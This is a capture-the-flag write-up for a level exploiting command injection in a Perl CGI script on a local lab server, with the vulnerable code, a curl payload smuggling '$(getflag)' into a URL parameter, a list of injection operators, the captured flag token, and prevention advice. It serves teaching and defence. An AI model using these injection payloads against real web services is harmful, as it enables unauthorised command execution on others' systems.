# Level 04 - CGI Command Injection

## Objective
Exploit a web CGI script to execute commands as `flag04`.

## My Notes

Found a Perl CGI script:
```bash
cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;   # ← VULNERABLE!
}
x(param("x"));
```

The dangerous line is `print \`echo $y 2>&1\`;` - backticks in Perl execute shell commands, and `$y` comes directly from the URL parameter with no sanitization.

The script runs on port 4747. If I visit `http://localhost:4747/level04.pl?x=hello`, it executes `echo hello 2>&1`. But I can inject shell commands.

Command injection options:
- `;getflag` → runs getflag after echo
- `$(getflag)` → command substitution
- `` `getflag` `` → nested backticks

Used `$(getflag)`:
```bash
curl 'http://localhost:4747/level04.pl?x=$(getflag)'
```

When processed, `$y = "$(getflag)"` gets passed to the shell. The shell expands `$(getflag)`, runs getflag, and substitutes the output into the echo command.

Token: `ne2searoevaevoem4ov4ar8ap`

## Solution
```bash
curl 'http://localhost:4747/level04.pl?x=$(getflag)'
```

## Key Takeaways

**CGI (Common Gateway Interface):** Old protocol for server-side scripts. Browser → web server → CGI script → HTML → browser. CGI scripts often run with web server privileges, making them good targets.

**Command injection:** User input passed to shell without sanitization. Can inject commands using `;`, `$()`, `` ` ``, `|`, `&&`, etc.

**Perl backticks:** Backticks in Perl execute shell commands, just like `$()` in bash. Also dangerous: `system()`, `exec()`, `open()` with pipes.

**URL encoding:** Special chars need encoding (`$` = `%24`, `` ` `` = `%60`, `;` = `%3B`), but shell still interprets them after web server decodes.

**Execution flow:** Attacker crafts URL → web server → CGI script (runs with flag04 SUID) → user input in backticks → shell executes → getflag runs as flag04.

## Tools Used
- `curl` - HTTP client
- Browser also works

## Prevention
- Never pass user input to shell commands
- Use parameterized commands: `system("echo", $input)` instead of `system("echo $input")`
- Whitelist valid input
- Escape special chars with `quotemeta()` in Perl
- Use modern frameworks with automatic escaping
- Run CGI with minimal privileges
